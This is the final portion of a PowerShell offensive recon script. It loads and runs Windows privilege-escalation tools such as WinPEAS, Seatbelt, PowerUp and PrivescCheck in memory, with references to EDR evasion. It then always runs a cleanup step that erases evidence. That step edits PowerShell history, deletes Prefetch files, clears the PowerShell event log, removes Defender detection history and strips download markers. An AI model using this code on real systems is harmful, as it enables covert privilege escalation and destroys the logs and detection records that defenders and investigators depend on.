    Write-Log "Removing forensic traces"
    $cleanupResults = @{}

    # 1. Clear PowerShell command history for this session
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            $historyContent = Get-Content $historyPath -ErrorAction SilentlyContinue
            if ($historyContent) {
                # Remove lines referencing this script and tool names
                $filterPatterns = @("Invoke-WindowsRecon", "WinPEAS", "Seatbelt", "SharpUp", "JAWS", "PowerUp", "Powerless", "PrivescCheck", "ReconResults")
                $cleanedHistory = $historyContent | Where-Object {
                    $line = $_
                    $shouldRemove = $false
                    foreach ($pattern in $filterPatterns) {
                        if ($line -match [regex]::Escape($pattern)) {
                            $shouldRemove = $true
                            break
                        }
                    }
                    -not $shouldRemove
                }
                Set-Content -Path $historyPath -Value $cleanedHistory -Force -ErrorAction Stop
                $cleanupResults["PS History"] = "Cleaned"
            }
        }
        Write-Log "Cleaned PowerShell history"
    } catch {
        $cleanupResults["PS History"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean PS history: $($_.Exception.Message)" -Level "WARN"
    }

    # 2. Clear Prefetch entries
    try {
        $prefetchDir = "$env:SystemRoot\Prefetch"
        $toolPatterns = @("WINPEAS", "SEATBELT", "SHARPUP", "JAWS", "POWERUP", "POWERLESS", "PRIVESCCHECK")
        $removed = 0
        foreach ($pattern in $toolPatterns) {
            Get-ChildItem -Path $prefetchDir -Filter "*$pattern*" -ErrorAction SilentlyContinue |
                ForEach-Object {
                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                    $removed++
                }
        }
        $cleanupResults["Prefetch"] = "Cleaned ($removed entries)"
        Write-Log "Cleaned Prefetch entries: $removed"
    } catch {
        $cleanupResults["Prefetch"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Prefetch: $($_.Exception.Message)" -Level "WARN"
    }

    # 3. Clear PowerShell event logs (Script Block Logging)
    try {
        $logName = "Microsoft-Windows-PowerShell/Operational"
        $sessionStartTime = $Script:StartTime
        if ($sessionStartTime) {
            # Clear recent PowerShell operational log entries
            wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            $cleanupResults["PS EventLog"] = "Cleared"
            Write-Log "Cleared PowerShell operational event log"
        }
    } catch {
        $cleanupResults["PS EventLog"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clear PS event log: $($_.Exception.Message)" -Level "WARN"
    }

    # 4. Clear Defender detection history
    try {
        $defenderHistoryPath = "$env:ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory"
        if (Test-Path $defenderHistoryPath) {
            Get-ChildItem -Path $defenderHistoryPath -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.LastWriteTime -ge $Script:StartTime } |
                ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
            $cleanupResults["Defender History"] = "Cleaned"
            Write-Log "Cleaned Defender detection history"
        } else {
            $cleanupResults["Defender History"] = "Not present"
        }
    } catch {
        $cleanupResults["Defender History"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Defender history: $($_.Exception.Message)" -Level "WARN"
    }

    # 5. Clear Zone.Identifier ADS from temp files
    try {
        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -ge $Script:StartTime } |
            ForEach-Object {
                $adsPath = "$($_.FullName):Zone.Identifier"
                Remove-Item $adsPath -Force -ErrorAction SilentlyContinue
            }
        $cleanupResults["Zone Identifiers"] = "Cleaned"
        Write-Log "Cleaned Zone.Identifier ADS"
    } catch {
        $cleanupResults["Zone Identifiers"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Zone.Identifier ADS: $($_.Exception.Message)" -Level "WARN"
    }

    # 6. Clear recent items / jump lists that reference tools
    try {
        $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
        $toolPatterns = @("WinPEAS", "Seatbelt", "SharpUp", "JAWS", "PowerUp", "Powerless", "PrivescCheck", "ReconResults")
        foreach ($pattern in $toolPatterns) {
            Get-ChildItem -Path $recentPath -Filter "*$pattern*" -ErrorAction SilentlyContinue |
                ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
        }
        $cleanupResults["Recent Items"] = "Cleaned"
        Write-Log "Cleaned Recent Items"
    } catch {
        $cleanupResults["Recent Items"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Recent Items: $($_.Exception.Message)" -Level "WARN"
    }

    # 7. Clear .NET assembly loading cache artifacts
    try {
        $assemblyCachePaths = @(
            "$env:LOCALAPPDATA\assembly",
            "$env:SystemRoot\assembly\temp"
        )
        foreach ($cachePath in $assemblyCachePaths) {
            if (Test-Path $cachePath) {
                Get-ChildItem -Path $cachePath -Recurse -ErrorAction SilentlyContinue |
                    Where-Object { $_.LastWriteTime -ge $Script:StartTime } |
                    ForEach-Object { Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue }
            }
        }
        $cleanupResults["Assembly Cache"] = "Cleaned"
        Write-Log "Cleaned .NET assembly cache"
    } catch {
        $cleanupResults["Assembly Cache"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean assembly cache: $($_.Exception.Message)" -Level "WARN"
    }

    return $cleanupResults
}

function Show-CleanupReport {
    param([hashtable]$CleanupResults)

    Write-Host ""
    Write-Host "  CLEANUP REPORT" -ForegroundColor White
    Write-Host "  ===============" -ForegroundColor DarkGray

    if ($CleanupResults) {
        foreach ($item in $CleanupResults.GetEnumerator()) {
            $icon = if ($item.Value -match "^(Cleaned|Cleared|Not present)") { "[PASS]" } else { "[WARN]" }
            $color = if ($icon -eq "[PASS]") { "Green" } else { "Yellow" }
            Write-Host "  $icon " -ForegroundColor $color -NoNewline
            Write-Host "$($item.Key): $($item.Value)"
        }
    }

    Write-Host ""
}

# ============================================================================
# SECTION J: SUMMARY
# ============================================================================

function Show-Summary {
    $elapsed = if ($Script:StartTime) { (Get-Date) - $Script:StartTime } else { [TimeSpan]::Zero }
    $elapsedStr = "{0:D2}:{1:D2}" -f [int]$elapsed.TotalMinutes, $elapsed.Seconds
    $separator = "=" * 56

    Write-Host ""
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host "  EXECUTION SUMMARY" -ForegroundColor Cyan
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host ""

    $okCount = 0
    $failCount = 0

    foreach ($tool in $Script:EnabledTools) {
        $tr = $Script:ToolResults[$tool.Name]
        $statusIcon = ""
        $color = "White"

        switch ($tr.Status) {
            "OK"      { $statusIcon = "[OK]     "; $color = "Green"; $okCount++ }
            "FAIL"    { $statusIcon = "[FAIL]   "; $color = "Red"; $failCount++ }
            "TIMEOUT" { $statusIcon = "[TIMEOUT]"; $color = "Red"; $failCount++ }
            "SKIP"    { $statusIcon = "[SKIP]   "; $color = "Cyan"; $failCount++ }
            default   { $statusIcon = "[???]    "; $color = "Gray" }
        }

        Write-Host "  $statusIcon " -ForegroundColor $color -NoNewline
        Write-Host "$($tool.Name.PadRight(16))" -NoNewline

        if ($tr.Duration -gt 0) {
            Write-Host " $([math]::Round($tr.Duration, 1))s" -NoNewline -ForegroundColor DarkGray
        }

        if ($tr.OutputSize -gt 0) {
            $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } else { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" }
            Write-Host "  -> $sizeStr" -NoNewline -ForegroundColor DarkGray
        }

        if ($tr.Error) {
            Write-Host "  ($($tr.Error))" -NoNewline -ForegroundColor DarkYellow
        }

        Write-Host ""
    }

    Write-Host ""
    Write-Host ("  Results: {0} OK / {1} Failed / {2} Total" -f $okCount, $failCount, $Script:EnabledTools.Count) -ForegroundColor White
    Write-Host ("  Total Time: {0}" -f $elapsedStr) -ForegroundColor DarkGray
    Write-Host ("  Output Dir: {0}" -f $Script:OutputDir) -ForegroundColor DarkGray
    Write-Host ""

    # Write summary file
    $summaryFile = Join-Path $Script:OutputDir "summary.txt"
    $summaryContent = @"
Windows Security Recon - Summary
================================
Host: $($env:COMPUTERNAME)
User: $($env:USERNAME)
Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Duration: $elapsedStr

Tool Results:
"@
    foreach ($tool in $Script:EnabledTools) {
        $tr = $Script:ToolResults[$tool.Name]
        $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } elseif ($tr.OutputSize -gt 0) { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" } else { "N/A" }
        $summaryContent += "`n  $($tr.Status.PadRight(8)) $($tool.Name.PadRight(16)) Duration: $([math]::Round($tr.Duration, 1))s  Output: $sizeStr"
        if ($tr.Error) { $summaryContent += "  Error: $($tr.Error)" }
    }
    $summaryContent += "`n`nResults: $okCount OK / $failCount Failed / $($Script:EnabledTools.Count) Total"
    $summaryContent += "`nOutput Directory: $($Script:OutputDir)"
    Set-Content -Path $summaryFile -Value $summaryContent -Encoding UTF8
    Write-Log "Summary written to $summaryFile"
}

# ============================================================================
# SECTION K: MAIN ORCHESTRATION
# ============================================================================

try {
    # Banner
    Show-Banner

    # Phase 0: Pre-flight checks
    $Script:CurrentPhase = "PRE-FLIGHT"
    Invoke-PreFlightChecks

    # Initialize environment (dirs, TLS, EDR evasion)
    Initialize-Environment

    # Initialize dashboard
    Initialize-Dashboard
    $Script:CurrentPhase = "DOWNLOAD"
    Show-Dashboard

    # Phase 1: Download/Load all tools
    $toolDataMap = @{}
    foreach ($tool in $Script:EnabledTools) {
        $toolName = $tool.Name
        try {
            $Script:ToolResults[$toolName].Status = "RUNNING"
            $Script:ToolResults[$toolName].StartedAt = Get-Date
            Show-Dashboard

            $toolData = Get-Tool -Tool $tool
            $toolDataMap[$toolName] = $toolData

            $Script:ToolResults[$toolName].Status = "PENDING"
            $Script:ToolResults[$toolName].StartedAt = $null
            Write-Log "Tool $toolName loaded successfully"
        } catch {
            $errMsg = $_.Exception.Message
            if ($errMsg.Length -gt 60) { $errMsg = $errMsg.Substring(0, 60) + "..." }
            $Script:ToolResults[$toolName].Status = "FAIL"
            $Script:ToolResults[$toolName].Error = "Download failed: $errMsg"
            $Script:ToolResults[$toolName].Duration = if ($Script:ToolResults[$toolName].StartedAt) {
                ((Get-Date) - $Script:ToolResults[$toolName].StartedAt).TotalSeconds
            } else { 0 }
            Write-Log "Tool $toolName download failed: $($_.Exception.Message)" -Level "ERROR"
            Show-Dashboard
        }
    }

    # Phase 2: Execute tools
    $Script:CurrentPhase = "EXECUTION"
    Show-Dashboard

    foreach ($tool in $Script:EnabledTools) {
        $toolName = $tool.Name

        # Skip if download failed
        if ($Script:ToolResults[$toolName].Status -eq "FAIL") {
            continue
        }

        $toolData = $toolDataMap[$toolName]
        $Script:ToolResults[$toolName].Status = "RUNNING"
        $Script:ToolResults[$toolName].StartedAt = Get-Date
        Show-Dashboard

        try {
            # Execute with timeout
            $job = Start-Job -ScriptBlock {
                param($ScriptRoot, $ToolJson, $ToolDataJson, $OutputDir)

                # Reconstruct tool and data inside the job
                $tool = $ToolJson | ConvertFrom-Json
                $toolData = $ToolDataJson | ConvertFrom-Json

                # We can't easily run complex reflection inside jobs,
                # so we'll use runspaces for exe tools instead
            } -ArgumentList $PSScriptRoot, ($tool | ConvertTo-Json), ($toolData | ConvertTo-Json), $Script:OutputDir

            # For simplicity and reliability, run tools synchronously with timeout via runspace
            $runspace = [powershell]::Create()
            $toolRef = $tool
            $toolDataRef = $toolData
            $outputDir = $Script:OutputDir
            $timeoutSec = $TimeoutSeconds

            $runspace.AddScript({
                param($Tool, $ToolData, $OutputDir)

                $toolName = $Tool.Name
                $toolType = $Tool.Type
                $outputFile = Join-Path $OutputDir "$toolName-output.txt"

                switch ($toolType) {
                    "exe" {
                        $bytes = [Convert]::FromBase64String($ToolData.BytesB64)
                        $assembly = [System.Reflection.Assembly]::Load($bytes)
                        $entryPoint = $assembly.EntryPoint

                        if (-not $entryPoint) {
                            throw "No entry point found in $toolName assembly"
                        }

                        $oldOut = [Console]::Out
                        $stringWriter = New-Object System.IO.StringWriter
                        [Console]::SetOut($stringWriter)

                        try {
                            $params = $Tool.Args
                            if ($entryPoint.GetParameters().Count -gt 0) {
                                $entryPoint.Invoke($null, @(,[string[]]$params))
                            } else {
                                $entryPoint.Invoke($null, $null)
                            }
                        } catch {
                            # Many tools throw on completion
                        } finally {
                            [Console]::SetOut($oldOut)
                        }

                        $output = $stringWriter.ToString()
                        $stringWriter.Dispose()

                        if ($output.Length -gt 0) {
                            [System.IO.File]::WriteAllText($outputFile, $output, [System.Text.Encoding]::UTF8)
                        } else {
                            throw "$toolName produced no output"
                        }
                    }
                    "ps1" {
                        $scriptContent = $ToolData.Script

                        $invokeCmd = switch ($toolName) {
                            "PowerUp"       { $scriptContent + "`nInvoke-AllChecks" }
                            "PrivescCheck"  { $scriptContent + "`nInvoke-PrivescCheck -Extended" }
                            default         { $scriptContent }
                        }

                        $sb = [scriptblock]::Create($invokeCmd)
                        $output = & $sb | Out-String

                        if ($output.Length -gt 0) {
                            [System.IO.File]::WriteAllText($outputFile, $output, [System.Text.Encoding]::UTF8)
                        } else {
                            throw "$toolName produced no output"
                        }
                    }
                    "bat" {
                        $batPath = $ToolData.Path
                        $output = & cmd.exe /c "`"$batPath`"" 2>&1 | Out-String

                        if ($output.Length -gt 0) {
                            [System.IO.File]::WriteAllText($outputFile, $output, [System.Text.Encoding]::UTF8)
                        } else {
                            throw "$toolName produced no output"
                        }
                    }
                }

                return $outputFile
            }).AddArgument($toolRef)

            # Prepare tool data for passing to runspace
            $toolDataForRunspace = @{}
            if ($toolData.Bytes) {
                $toolDataForRunspace["BytesB64"] = [Convert]::ToBase64String($toolData.Bytes)
            }
            if ($toolData.Script) {
                $toolDataForRunspace["Script"] = $toolData.Script
            }
            if ($toolData.Path) {
                $toolDataForRunspace["Path"] = $toolData.Path
            }

            $runspace.AddArgument([PSCustomObject]$toolDataForRunspace)
            $runspace.AddArgument($outputDir)

            $handle = $runspace.BeginInvoke()

            # Wait with timeout, updating dashboard periodically
            $deadline = (Get-Date).AddSeconds($timeoutSec)
            while (-not $handle.IsCompleted -and (Get-Date) -lt $deadline) {
                Start-Sleep -Milliseconds 500
                Show-Dashboard
            }

            if (-not $handle.IsCompleted) {
                # Timeout
                $runspace.Stop()
                $runspace.Dispose()
                $Script:ToolResults[$toolName].Status = "TIMEOUT"
                $Script:ToolResults[$toolName].Error = "Exceeded ${timeoutSec}s timeout"
                $Script:ToolResults[$toolName].Duration = $timeoutSec
                Write-Log "Tool $toolName timed out after ${timeoutSec}s" -Level "ERROR"
            } else {
                try {
                    $result = $runspace.EndInvoke($handle)
                    $runspace.Dispose()

                    $outputFile = Join-Path $Script:OutputDir "$toolName-output.txt"
                    $duration = ((Get-Date) - $Script:ToolResults[$toolName].StartedAt).TotalSeconds

                    if (Test-Path $outputFile) {
                        $fileSize = (Get-Item $outputFile).Length
                        $Script:ToolResults[$toolName].Status = "OK"
                        $Script:ToolResults[$toolName].Duration = $duration
                        $Script:ToolResults[$toolName].OutputSize = $fileSize
                        Write-Log "Tool $toolName completed in $([math]::Round($duration, 1))s - Output: $fileSize bytes"
                    } else {
                        throw "$toolName completed but produced no output file"
                    }
                } catch {
                    $runspace.Dispose()
                    throw
                }
            }

            # Clean up background job if created
            if ($job) { Remove-Job $job -Force -ErrorAction SilentlyContinue }

        } catch {
            $errMsg = $_.Exception.Message
            if ($_.Exception.InnerException) {
                $errMsg = $_.Exception.InnerException.Message
            }
            if ($errMsg.Length -gt 80) { $errMsg = $errMsg.Substring(0, 80) + "..." }

            $duration = if ($Script:ToolResults[$toolName].StartedAt) {
                ((Get-Date) - $Script:ToolResults[$toolName].StartedAt).TotalSeconds
            } else { 0 }

            $Script:ToolResults[$toolName].Status = "FAIL"
            $Script:ToolResults[$toolName].Error = $errMsg
            $Script:ToolResults[$toolName].Duration = $duration
            Write-Log "Tool $toolName execution failed: $($_.Exception.Message)" -Level "ERROR"
        }

        Show-Dashboard
    }

    # Phase 3: Summary
    $Script:CurrentPhase = "SUMMARY"
    Show-Summary

} finally {
    # Phase 4: Cleanup (ALWAYS runs, even on Ctrl+C)
    $Script:CurrentPhase = "CLEANUP"
    Write-Host ""
    Write-Host "  Performing cleanup..." -ForegroundColor DarkGray

    # Remove downloaded tools
    Remove-ReconTools

    # Remove forensic traces
    $cleanupResults = Remove-ForensicTraces

    # Show cleanup report
    Show-CleanupReport -CleanupResults $cleanupResults

    Write-Host "  Recon complete. Results saved to:" -ForegroundColor Green
    Write-Host "  $($Script:OutputDir)" -ForegroundColor Cyan
    Write-Host ""
}
